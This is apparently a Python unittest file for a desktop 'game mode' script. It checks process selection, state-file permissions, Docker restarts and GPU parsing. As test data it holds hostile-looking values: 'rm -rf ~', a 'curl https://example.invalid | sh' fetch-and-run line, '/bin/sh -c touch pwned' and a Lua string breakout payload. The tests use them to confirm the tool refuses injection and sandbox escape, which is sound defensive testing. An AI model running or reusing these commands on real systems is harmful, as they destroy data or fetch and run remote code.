"""Tests for bin/gamercenter-gamemode, ported from omarchy-gamemode (MIT). State goes to a throwaway $XDG_STATE_HOME; nothing is
closed, stopped or started.

    python3 -m unittest discover -s tests
"""

import importlib.machinery
import importlib.util
import json
import os
import shutil
import stat
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

REPO = Path(__file__).resolve().parent.parent
SCRIPT = REPO / "bin" / "gamercenter-gamemode"


def load(state_home):
    os.environ["XDG_STATE_HOME"] = str(state_home)
    loader = importlib.machinery.SourceFileLoader("gamercenter_gamemode", str(SCRIPT))
    spec = importlib.util.spec_from_loader(loader.name, loader)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


OWN = ("mnt:[1]", "user:[1]", "pid:[1]")         # this session's namespaces
SANDBOX = ("mnt:[2]", "user:[2]", "pid:[2]")     # a Flatpak's


def proc(gm, pid, ppid, comm, argv, mb=0, exe=None, ns=OWN, path=None):
    p = gm.Proc()
    p.pid, p.ppid, p.comm, p.argv, p.kb = pid, ppid, comm, argv, mb * 1024
    p.exe = exe or comm
    p.path = "/usr/bin/" + p.exe if path is None else path
    p.ns = ns
    return p


class GameModeTest(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="gamemode-test-"))
        self.gm = load(self.tmp)
        self.dir = Path(self.gm.STATE_DIR)

    def tearDown(self):
        shutil.rmtree(self.tmp)

    def mode(self, path):
        return stat.S_IMODE(os.stat(path).st_mode)

    # ------------------------------------------------------------ files

    def test_selection_is_remembered_privately(self):
        self.gm.cmd_select(["app:slack"], False)
        self.assertEqual(self.gm.read_prefs(), {"app:slack": False})
        self.assertEqual(self.mode(self.dir), 0o700)
        self.assertEqual(self.mode(self.gm.PREFS), 0o600)

    def test_existing_open_folder_is_tightened(self):
        self.dir.mkdir(mode=0o755, parents=True)
        os.chmod(self.dir, 0o755)
        self.gm.cmd_select(["indexer"], True)
        self.assertEqual(self.mode(self.dir), 0o700)

    def test_file_others_can_write_is_ignored(self):
        self.gm.write_json(self.gm.STATE, {"items": [{"key": "indexer", "kind": "indexer", "label": "File indexer"}]})
        self.assertIsNotNone(self.gm.read_state())
        os.chmod(self.gm.STATE, 0o622)
        self.assertIsNone(self.gm.read_state())

    def test_symlinked_state_is_ignored(self):
        other = self.tmp / "elsewhere.json"
        other.write_text(json.dumps({"items": [{"key": "indexer", "kind": "indexer", "label": "x"}]}))
        os.chmod(other, 0o600)
        self.gm.ensure_dir()
        os.symlink(other, self.gm.STATE)
        self.assertIsNone(self.gm.read_state())

    def test_malformed_records_are_dropped(self):
        good = {"key": "app:slack", "kind": "app", "label": "Slack", "name": "slack", "argv": ["/usr/bin/slack"]}
        bad = [
            {"key": "app:x", "kind": "app", "label": "X", "name": "x", "argv": "rm -rf ~"},
            {"key": "app:y", "kind": "app", "label": "Y", "name": "y", "argv": []},
            {"key": "docker:z", "kind": "docker", "label": "z", "containers": [{"id": 5}]},
            {"key": "w", "kind": "shell", "label": "w"},
        ]
        self.gm.write_json(self.gm.STATE, {"since": 1, "items": [good] + bad})
        self.assertEqual(self.gm.read_state()["items"], [good])

    def test_apps_saved_by_an_older_version_never_run(self):
        # Before 1.0.2 a sandboxed process could get its command line saved, so a record
        # without the format mark is never run; Docker and the indexer still come back.
        old = {"key": "app:evil", "kind": "app", "label": "Evil", "name": "evil", "argv": ["/bin/sh", "-c", "touch pwned"]}
        new = {"key": "app:slack", "kind": "app", "label": "Slack", "name": "slack", "argv": ["/usr/bin/slack"],
               "format": self.gm.RECORD_FORMAT}
        indexer = {"key": "indexer", "kind": "indexer", "label": "File indexer"}
        self.gm.write_json(self.gm.STATE, {"since": 1, "items": [old, new, indexer]})
        self.assertEqual(self.gm.describe(self.gm.read_state()["items"][0], True), "Closed by an older version · start it yourself")
        ran, notes = [], []
        self.gm.apps = lambda procs: {}
        self.gm.processes = lambda: {}
        self.gm.run = lambda *cmd, **kw: ran.append(list(cmd))
        self.gm.notify = lambda title, body, urgency="normal": notes.append((title, body, urgency))
        with mock.patch.object(self.gm.subprocess, "Popen", lambda argv, **kw: ran.append(argv)):
            self.gm.cmd_off()
        self.assertFalse(any(cmd[-3:] == old["argv"] for cmd in ran))
        self.assertTrue(any(cmd[-1:] == new["argv"] for cmd in ran))
        self.assertIn(["systemctl", "--user", "start", self.gm.INDEXER], ran)
        self.assertEqual(notes, [("Game mode off", "Back: Slack, File indexer\n"
                                  "Evil wasn't reopened (an older Game mode saved it): start it yourself", "critical")])
        self.assertFalse(os.path.exists(self.gm.STATE))

    def test_paused_apps_are_saved_with_the_format_mark(self):
        app = {"key": "app:slack", "kind": "app", "label": "Slack", "name": "slack", "argv": ["/usr/bin/slack"], "pids": []}
        record, wait = self.gm.pause(app)
        self.assertEqual(wait(), [])
        self.assertEqual(record["format"], self.gm.RECORD_FORMAT)
        self.assertTrue(self.gm.valid_record(record) and self.gm.trusted(record))

    def test_empty_state_removes_the_file(self):
        self.gm.write_json(self.gm.STATE, {"items": [{"key": "indexer", "kind": "indexer", "label": "x"}]})
        self.gm.save_state({"items": []})
        self.assertFalse(os.path.exists(self.gm.STATE))

    # ------------------------------------------------------------ choosing

    def test_defaults(self):
        self.assertTrue(self.gm.selected("app:chrome", {}))
        self.assertTrue(self.gm.selected("indexer", {}))
        self.assertTrue(self.gm.selected("docker:shop", {}))
        self.assertFalse(self.gm.selected("app:obsidian", {}))
        self.assertFalse(self.gm.selected("app:chrome", {"app:chrome": False}))

    def test_names(self):
        gm = self.gm
        self.assertEqual(gm.app_name(proc(gm, 1, 0, "python3", ["python3", "-u", "/opt/x/tool.py"], exe="python3.14")), "tool")
        self.assertEqual(gm.app_name(proc(gm, 1, 0, "voxtype", ["voxtype"], exe="voxtype-avx2")), "voxtype")
        self.assertTrue(gm.is_game(proc(gm, 1, 0, "Game.exe", ["C:\\Game.exe"], exe="Game.exe")))
        self.assertTrue(gm.is_game(proc(gm, 1, 0, "bash", ["bash", "/home/u/.local/share/Steam/steam.sh"])))
        self.assertFalse(gm.is_game(proc(gm, 1, 0, "chrome", ["/opt/google/chrome/chrome"])))

    def test_only_safe_apps_are_offered(self):
        gm = self.gm
        ps = [
            proc(gm, 10, 1, "systemd", ["/usr/lib/systemd/systemd", "--user"]),
            proc(gm, 11, 10, "Hyprland", ["Hyprland"]),
            # Chrome: main process plus a renderer, counted together.
            proc(gm, 20, 10, "chrome", ["/opt/google/chrome/chrome"], mb=400),
            proc(gm, 21, 20, "chrome", ["/opt/google/chrome/chrome", "--type=renderer"], mb=600),
            # A browser an automation tool started.
            proc(gm, 25, 10, "chrome", ["/opt/google/chrome/chrome", "--remote-debugging-pipe"], mb=900),
            # A terminal running an agent, and a launcher running a game.
            proc(gm, 30, 11, "kitty", ["kitty"], mb=300),
            proc(gm, 31, 30, "claude", ["claude"], mb=400),
            proc(gm, 40, 10, "heroic", ["/opt/Heroic/heroic"], mb=500),
            proc(gm, 41, 40, "Game.exe", ["Game.exe"], mb=4000, exe="Game.exe"),
            # Something with an agent inside that isn't a terminal.
            proc(gm, 50, 11, "herdr", ["herdr", "server"], mb=300),
            proc(gm, 51, 50, "claude", ["claude"], mb=300),
            # Too small to bother with, and system plumbing.
            proc(gm, 60, 10, "kdeconnectd", ["kdeconnectd"], mb=50),
            proc(gm, 70, 10, "pipewire", ["pipewire"], mb=900),
            proc(gm, 80, 11, "slack", ["/usr/lib/slack/slack"], mb=300),
        ]
        found = gm.apps({p.pid: p for p in ps}, manager=10, own=OWN)
        self.assertEqual(sorted(found), ["chrome", "slack"])
        self.assertEqual(found["chrome"]["mb"], 1000)
        self.assertEqual(found["chrome"]["pids"], [20])

    def test_rewritten_browser_command_line_is_split_back(self):
        gm = self.gm
        one = ["/opt/brave-bin/brave --ozone-platform=wayland --load-extension=/a,/b --no-default-browser-check"]
        self.assertEqual(gm.split_title(one, "/opt/brave-bin/brave"),
                         ["/opt/brave-bin/brave", "--ozone-platform=wayland", "--load-extension=/a,/b",
                          "--no-default-browser-check"])
        # Left alone: a normal argv, a first word that isn't the program, an unreadable program.
        self.assertEqual(gm.split_title(["/usr/bin/slack", "--x"], "/usr/bin/slack"), ["/usr/bin/slack", "--x"])
        self.assertEqual(gm.split_title(["/bin/sh -c evil"], "/opt/brave-bin/brave"), ["/bin/sh -c evil"])
        self.assertEqual(gm.split_title(["/opt/brave-bin/brave --x"], ""), ["/opt/brave-bin/brave --x"])

    def test_windows_go_back_to_their_workspaces(self):
        gm = self.gm
        found = [{"address": "0x1", "pid": 20, "class": "brave-browser", "title": "Docs - Brave", "workspace": "1"},
                 {"address": "0x2", "pid": 20, "class": "brave-browser", "title": "Mail - Brave", "workspace": "5"},
                 {"address": "0x3", "pid": 30, "class": "foot", "title": "foot", "workspace": "3"}]
        saved = gm.windows_of([20, 21], found)
        self.assertEqual(saved, [{"class": "brave-browser", "title": "Docs - Brave", "workspace": "1"},
                                 {"class": "brave-browser", "title": "Mail - Brave", "workspace": "5"}])
        new = [{"address": "0xa", "class": "brave-browser", "title": "Mail - Brave"},
               {"address": "0xb", "class": "brave-browser", "title": "New Tab - Brave"},
               {"address": "0xc", "class": "foot", "title": "foot"}]
        # Same title goes where it was; an unknown one goes to the first most-used workspace; others stay.
        self.assertEqual(gm.plan_moves(saved, new), {"0xa": "5", "0xb": "1"})
        # A workspace name that could break out of the Lua string is never used.
        self.assertEqual(gm.plan_moves([{"class": "x", "title": "", "workspace": '1" }) os.exit('}],
                                       [{"address": "0x9", "class": "x", "title": ""}]), {})
        moved = []
        gm.run = lambda *cmd, **kw: moved.append(cmd)
        gm.move_window("0xa", "special:magic")
        gm.move_window("0xa; rm", "1")
        gm.move_window("0xa", "1\" })")
        self.assertEqual(moved, [("hyprctl", "dispatch",
                                  'hl.dsp.window.move({ workspace = "special:magic", follow = false, window = "address:0xa" })')])

    def test_games_are_detected(self):
        def tree(*procs):
            root = Path(tempfile.mkdtemp(dir=self.tmp))
            for pid, comm, argv in procs:
                d = root / str(pid)
                d.mkdir()
                (d / "comm").write_text(comm + "\n")
                (d / "cmdline").write_bytes(b"\0".join(a.encode() for a in argv) + b"\0")
            return str(root)
        steam_idle = [(1, "steam", ["/home/u/.local/share/Steam/steamrt64/steam", "-srt-logger-opened"]),
                      (2, "steamwebhelper", ["./steamwebhelper", "-nocrashdialog"]),
                      (3, "bash", ["bash", "/home/u/.local/share/Steam/steam.sh"])]
        self.assertIsNone(self.gm.find_game(tree(*steam_idle)))
        wine_idle = [(4, "wineserver", ["/usr/bin/wineserver"]), (5, "explorer.exe", ["C:\\windows\\explorer.exe"]),
                     (6, "services.exe", ["C:\\windows\\system32\\services.exe"])]
        self.assertIsNone(self.gm.find_game(tree(*wine_idle)))
        self.assertEqual(self.gm.find_game(tree(*steam_idle, (7, "reaper", ["reaper", "SteamLaunch", "AppId=1172470", "--", "/x"]))),
                         "Steam game 1172470")
        self.assertEqual(self.gm.find_game(tree(*wine_idle, (8, "SongsOfSyx.exe", ["Z:\\games\\SongsOfSyx.exe"]))),
                         "SongsOfSyx.exe")
        # comm is cut at 15 characters; the command line still has the whole name.
        self.assertEqual(self.gm.find_game(tree((9, "LongGameNameHer", ["C:\\g\\LongGameNameHere.exe"]))),
                         "LongGameNameHere.exe")
        self.assertEqual(self.gm.find_game(tree((10, "gamescope", ["gamescope", "--", "game"]))), "gamescope")

    def test_auto_switch_is_remembered_and_marked(self):
        env = dict(os.environ, XDG_STATE_HOME=str(self.tmp))
        r = subprocess.run([sys.executable, "-I", str(SCRIPT), "auto", "on"], env=env, capture_output=True, text=True)
        self.assertEqual(r.returncode, 0)
        self.assertEqual(self.gm.read_prefs(), {"auto": True})
        for bad in (["auto", "maybe"], ["on", "--evil"], ["off", "x"], ["detect", "x"]):
            r = subprocess.run([sys.executable, "-I", str(SCRIPT), *bad], env=env, capture_output=True, text=True)
            self.assertEqual(r.returncode, 2, bad)
        notes = []
        self.gm.discover = lambda gpu=None: []
        self.gm.notify = lambda *a, **kw: notes.append(a)
        self.gm.cmd_on(auto=True)  # nothing ticked: stays quiet when a game started it
        self.assertEqual(notes, [])
        self.assertIsNone(self.gm.read_state())

    def test_browser_with_the_claude_extension_bridge_is_offered(self):
        gm = self.gm
        ps = [
            proc(gm, 10, 1, "systemd", ["/usr/lib/systemd/systemd", "--user"]),
            # Brave with Claude in Chrome's native host under it: no session there.
            proc(gm, 20, 10, "brave", ["/opt/brave-bin/brave", "--ozone-platform=wayland"], mb=400),
            proc(gm, 21, 20, "claude", ["/home/u/.local/bin/claude", "--chrome-native-host"], mb=10),
            # The same flag as a later argument of a real session still counts as a session.
            proc(gm, 30, 10, "code", ["/usr/bin/code"], mb=400),
            proc(gm, 31, 30, "claude", ["claude", "--resume", "x"], mb=300),
        ]
        found = gm.apps({p.pid: p for p in ps}, manager=10, own=OWN)
        self.assertEqual(sorted(found), ["brave"])
        self.assertEqual(found["brave"]["mb"], 410)
        self.assertTrue(gm.selected("app:brave", {}))
        self.assertEqual(gm.RESTORE_FLAGS["brave"], ["--restore-last-session"])

    def test_a_browser_comes_back_with_its_whole_session(self):
        """Its first process may be a web app (--app=URL); reopening that would open only it."""
        item = {"name": "brave", "argv": ["/opt/brave-bin/brave", "--ozone-platform=wayland",
                                          "--app=https://localhost:9443", "--new-window", "https://example.org",
                                          "--no-default-browser-check"]}
        self.assertEqual(self.gm.reopen_argv(item), ["/opt/brave-bin/brave", "--ozone-platform=wayland",
                                                     "--no-default-browser-check", "--restore-last-session"])
        other = {"name": "obsidian", "argv": ["/usr/bin/obsidian", "file.md"]}
        self.assertEqual(self.gm.reopen_argv(other), ["/usr/bin/obsidian", "file.md"])

    def test_sandboxed_processes_are_never_offered(self):
        """Their command line would be run on restore, outside the sandbox."""
        gm = self.gm
        evil = ["/usr/bin/sh", "-c", "curl https://example.invalid | sh"]
        ps = [
            proc(gm, 10, 1, "systemd", ["/usr/lib/systemd/systemd", "--user"], path=""),  # unreadable, as for real
            proc(gm, 11, 10, "Hyprland", ["Hyprland"]),
            # A Flatpak calls itself systemd, then Hyprland, and starts a big child named slack.
            proc(gm, 20, 10, "bwrap", ["bwrap", "--args", "37", "slack"], mb=10),
            proc(gm, 21, 20, "systemd", ["systemd"], exe="systemd", path="/usr/lib/systemd/systemd", ns=SANDBOX),
            proc(gm, 22, 21, "slack", evil, mb=900, exe="slack", ns=SANDBOX),
            proc(gm, 23, 20, "Hyprland", ["Hyprland"], exe="Hyprland", ns=SANDBOX),
            proc(gm, 24, 23, "slack", evil, mb=900, exe="slack", ns=SANDBOX),
            # A process of this session that renamed itself Hyprland; its program says otherwise.
            proc(gm, 30, 1, "Hyprland", ["/opt/x/x"], mb=10, exe="x"),
            proc(gm, 31, 30, "slack", evil, mb=900, exe="slack"),
            # Same mount namespace, own user namespace (how a browser sandboxes its renderers).
            proc(gm, 40, 11, "slack", evil, mb=900, exe="slack", ns=("mnt:[1]", "user:[3]", "pid:[3]")),
            # Namespaces that can't be read.
            proc(gm, 50, 11, "slack", evil, mb=900, exe="slack", ns=None),
        ]
        self.assertEqual(gm.apps({p.pid: p for p in ps}, manager=10, own=OWN), {})

    def test_the_service_manager_is_known_by_its_pid(self):
        gm = self.gm
        ps = [
            proc(gm, 10, 1, "systemd", ["/usr/lib/systemd/systemd", "--user"], path=""),
            proc(gm, 20, 10, "slack", ["/usr/lib/slack/slack"], mb=300),
            # Our own process named systemd isn't the manager.
            proc(gm, 30, 1, "systemd", ["/tmp/x"], exe="x"),
            proc(gm, 31, 30, "chrome", ["/opt/google/chrome/chrome"], mb=900),
        ]
        procs = {p.pid: p for p in ps}
        self.assertEqual(sorted(gm.apps(procs, manager=10, own=OWN)), ["slack"])
        self.assertEqual(gm.apps(procs, manager=0, own=OWN), {})
        self.assertEqual(gm.apps(procs, manager=10, own=None), {})

    # ------------------------------------------------------------ docker

    def test_projects_start_dependencies_first(self):
        gm = self.gm
        started = []

        class Done:
            returncode, stdout, stderr = 0, "", ""

        def fake_run(*cmd, timeout=30):
            if cmd[:2] == ("docker", "start"):
                started.append(cmd[2])
            return Done()

        gm.run = fake_run
        gm.container_state = lambda cid: ("running", "healthy")
        cs = [
            {"id": "nginx", "name": "p-nginx-1", "service": "nginx", "depends": ["backend"]},
            {"id": "backend", "name": "p-backend-1", "service": "backend", "depends": ["db", "redis"]},
            {"id": "db", "name": "p-db-1", "service": "db", "depends": []},
            {"id": "redis", "name": "p-redis-1", "service": "redis", "depends": []},
        ]
        self.assertEqual(gm.start_project(cs), [])
        self.assertEqual(set(started[:2]), {"db", "redis"})
        self.assertEqual(started[2:], ["backend", "nginx"])

    def test_taken_fixed_address_is_reclaimed(self):
        """Another project started first and took this container's fixed IP."""
        gm = self.gm
        calls = []

        class R:
            def __init__(self, code=0, out="", err=""):
                self.returncode, self.stdout, self.stderr = code, out, err

        door_started = []
        nets = {
            "door": {"NetworkSettings": {"Networks": {"shared": {"IPAMConfig": {"IPv4Address": "192.0.2.2"}}}}},
            "other": {"NetworkSettings": {"Networks": {"shared": {"IPAMConfig": {}}}}},
        }

        def fake_run(*cmd, timeout=30):
            calls.append(cmd[1:])
            if cmd[1:3] == ("network", "inspect"):
                return R(out=json.dumps([{"Containers": {"other": {"IPv4Address": "192.0.2.2/29"}}}]))
            if cmd[1] == "inspect" and cmd[2] in nets:
                return R(out=json.dumps([nets[cmd[2]]]))
            if cmd[1] == "start" and cmd[2] == "door":
                if not door_started and ("network", "disconnect", "shared", "other") not in calls:
                    return R(1, err="failed to set up container networking: Address already in use")
                door_started.append(True)
            return R()

        gm.run = fake_run
        gm.container_state = lambda cid: ("running", "")
        self.assertEqual(gm.start_project([{"id": "door", "name": "p-door-1", "service": "door", "depends": []}]), [])
        order = [c for c in calls if c[:2] in (("network", "disconnect"), ("start", "door"), ("network", "connect"))]
        self.assertEqual(order, [("start", "door"), ("network", "disconnect", "shared", "other"),
                                 ("start", "door"), ("network", "connect", "shared", "other")])

    def test_real_clash_is_left_alone(self):
        """Two containers asking for the same fixed address: nothing is moved."""
        gm = self.gm
        calls = []

        class R:
            def __init__(self, code=0, out="", err=""):
                self.returncode, self.stdout, self.stderr = code, out, err

        fixed = {"NetworkSettings": {"Networks": {"shared": {"IPAMConfig": {"IPv4Address": "192.0.2.2"}}}}}

        def fake_run(*cmd, timeout=30):
            calls.append(cmd[1:])
            if cmd[1:3] == ("network", "inspect"):
                return R(out=json.dumps([{"Containers": {"other": {"IPv4Address": "192.0.2.2/29"}}}]))
            if cmd[1] == "inspect":
                return R(out=json.dumps([fixed]))
            if cmd[1] == "start":
                return R(1, err="Address already in use")
            return R()

        gm.run = fake_run
        failed = gm.start_project([{"id": "door", "name": "p-door-1", "service": "door", "depends": []}])
        self.assertEqual(failed, ["p-door-1"])
        self.assertFalse(any(c[:2] == ("network", "disconnect") for c in calls))

    # ------------------------------------------------------------ gpu

    def test_nvidia_report(self):
        xml = """<?xml version="1.0" ?><nvidia_smi_log><gpu id="00000000:01:00.0">
          <fb_memory_usage><total>8188 MiB</total><used>1670 MiB</used></fb_memory_usage>
          <processes>
            <process_info><pid>20</pid><type>C+G</type><used_memory>283 MiB</used_memory></process_info>
            <process_info><pid>21</pid><type>G</type><used_memory>40 MiB</used_memory></process_info>
            <process_info><pid>junk</pid><used_memory>9 MiB</used_memory></process_info>
          </processes></gpu></nvidia_smi_log>"""
        self.assertEqual(self.gm.parse_nvidia(xml), ({20: 283, 21: 40}, 1670, 8188))
        self.assertIsNone(self.gm.parse_nvidia("not xml"))

    def test_fdinfo(self):
        amd = "pos:\t0\nflags:\t02100002\ndrm-driver:\tamdgpu\ndrm-client-id:\t42\ndrm-memory-vram:\t524288 KiB\n"
        self.assertEqual(self.gm.parse_fdinfo(amd), ("42", 524288))
        xe = "drm-driver:\txe\ndrm-client-id:\t7\ndrm-total-local0:\t64 MiB\ndrm-resident-local0:\t32 MiB\n"
        self.assertEqual(self.gm.parse_fdinfo(xe), ("7", 32 * 1024))
        self.assertIsNone(self.gm.parse_fdinfo("pos:\t0\nflags:\t0100002\n"))

    def test_sleeping_nvidia_gpu_is_not_woken(self):
        def dev(name, vendor, cls, status):
            d = self.tmp / "pci" / name
            (d / "power").mkdir(parents=True)
            (d / "vendor").write_text(vendor + "\n")
            (d / "class").write_text(cls + "\n")
            (d / "power" / "runtime_status").write_text(status + "\n")
        dev("0000:00:02.0", "0x8086", "0x030000", "active")
        dev("0000:01:00.0", "0x10de", "0x030200", "active")
        self.assertFalse(self.gm.nvidia_asleep(str(self.tmp / "pci")))
        (self.tmp / "pci" / "0000:01:00.0" / "power" / "runtime_status").write_text("suspended\n")
        self.assertTrue(self.gm.nvidia_asleep(str(self.tmp / "pci")))
        dev("0000:01:00.1", "0x10de", "0x040300", "suspended")  # its audio function doesn't count
        (self.tmp / "pci" / "0000:01:00.0" / "power" / "runtime_status").write_text("active\n")
        self.assertFalse(self.gm.nvidia_asleep(str(self.tmp / "pci")))

    def test_gpu_process_in_a_container(self):
        cid = "a" * 64
        self.assertEqual(self.gm.docker_id(f"0::/system.slice/docker-{cid}.scope\n"), cid)
        self.assertEqual(self.gm.docker_id(f"0::/docker/{cid}\n"), cid)
        self.assertIsNone(self.gm.docker_id("0::/user.slice/user-1000.slice/app.slice/app-chrome.scope\n"))

    def test_rows_show_vram(self):
        app = {"kind": "app", "mb": 4915, "vram": 283}
        self.assertEqual(self.gm.describe(app, False), "4.8 GB RAM · 283 MB VRAM · quits, reopens after")
        box = {"kind": "docker", "mb": 2150, "vram": 3072, "containers": [{}, {}]}
        self.assertEqual(self.gm.describe(box, False), "2 containers · 2.1 GB RAM · 3.0 GB VRAM")
        self.assertEqual(self.gm.describe({"kind": "app", "mb": 300, "vram": 0}, False), "0.3 GB RAM · quits, reopens after")

    # ------------------------------------------------------------ cli

    def test_unknown_command_is_refused(self):
        env = dict(os.environ, XDG_STATE_HOME=str(self.tmp))
        r = subprocess.run([sys.executable, "-I", str(SCRIPT), "rm", "-rf"], env=env, capture_output=True, text=True)
        self.assertEqual(r.returncode, 2)
        r = subprocess.run([sys.executable, "-I", str(SCRIPT), "pause"], env=env, capture_output=True, text=True)
        self.assertEqual(r.returncode, 2)
        for bad in (["pause", "--all"], ["resume", "app:x", "rm -rf"], ["select", "app:x", "maybe"], ["select", "on"]):
            r = subprocess.run([sys.executable, "-I", str(SCRIPT), *bad], env=env, capture_output=True, text=True)
            self.assertEqual(r.returncode, 2, bad)

    def test_a_whole_group_is_ticked_at_once(self):
        env = dict(os.environ, XDG_STATE_HOME=str(self.tmp))
        r = subprocess.run([sys.executable, "-I", str(SCRIPT), "select", "docker:shop", "docker:llm", "app:slack", "off"],
                           env=env, capture_output=True, text=True)
        self.assertEqual(r.returncode, 0, r.stderr)
        prefs = json.loads((self.tmp / "gamer-center" / "gamemode" / "selection.json").read_text())
        self.assertEqual(prefs, {"docker:shop": False, "docker:llm": False, "app:slack": False})
        self.assertEqual(self.gm.item_keys(["docker:my stack", "indexer"]), {"docker:my stack", "indexer"})
        self.assertIsNone(self.gm.item_keys(["app:a b"]))
        self.assertIsNone(self.gm.item_keys(["app:x"] * 65))


if __name__ == "__main__":
    unittest.main()
